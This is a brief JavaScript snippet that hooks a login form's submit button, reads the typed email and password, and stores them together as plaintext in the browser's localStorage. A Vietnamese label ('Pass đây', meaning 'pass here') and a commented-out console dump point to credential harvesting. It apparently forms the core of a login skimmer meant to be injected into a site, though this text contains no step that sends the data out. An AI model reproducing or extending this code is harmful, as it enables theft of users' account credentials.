document.getElementsByClassName('mdc-button mdc-button--raised full-width')[2].addEventListener("click", myFunction);
function myFunction() {
  var pass=document.getElementById("loginform-password").value;
  var email=document.getElementById("loginform-email").value;
// console.log("Email: "+email+" | Pass đây: "+pass);
var text_to_save="Email: "+email+" | Pass đây: "+pass;
localStorage.setItem("text", text_to_save); // save the item
}
